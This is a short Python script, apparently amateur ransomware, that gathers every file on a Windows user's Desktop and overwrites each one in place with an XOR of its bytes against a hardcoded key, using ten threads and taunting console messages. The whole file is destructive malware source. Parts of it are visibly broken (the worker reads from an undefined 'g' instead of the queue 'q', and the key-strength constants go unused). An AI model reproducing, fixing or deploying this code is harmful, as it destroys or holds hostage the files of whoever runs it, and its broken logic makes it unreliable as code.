import os
import threading
import queue
import queue
import random


##encryption funcrion that will run

def encrypt(key):
    while True:
        file = g.get()
        print(f'Now I am encrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            #opens file, and reads binary.
            with open(file, 'rb') as f:
                data = f.read()
             #opens file with write permissions
            with open(file,'w') as f:
                data = f.write('')
            #for every byte that is in the data it will write 1 byte / 1 little byte
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open (file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                ## incrementing key index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f'{file} has been encrypted')
        except:
            print('I failed to encrypt that I am not sorry tho!!!') 
        q.task_done()           

#ENCRYOPTUON INFORMATION

ENCRYPTION_LEVEL = 512 // 8  ## gives 512 bit encryption
key_char_pool = 'qwertyuiopasdfghjklzxcvbnm,.|;:!![]{}' #different chars for combination
key_char_pool_len = len(key_char_pool) # length of above

#files to grab and encrypt
print("fixing your files so I can encrypt them")
desktop_path = os.environ['USERPROFILE']+'\\Desktop' #getting desktop path
files = os.listdir(desktop_path) # listing directory
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe': #check for exe file and other files
       abs_files.append(f'{desktop_path}\\{f}') #finding all the files to encrypt
print("found all the files")

##Encryption key
print("I got a key for you")
key = '?I4mN0TY0urK1N6!'

## STORE FILES INTO A QUES TO MAKE THREADS HANDLE IT QUICKER
q = queue.Queue() 
for f in abs_files: 
    q.put(f) # making que so all the files dont encrypt at the same time (it will take longer, hence we dont have time for that we make it quick)

##setup threads

for i in range(10): #amount of threads
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print("Encryption completed hahha") 
input() #waiting for input

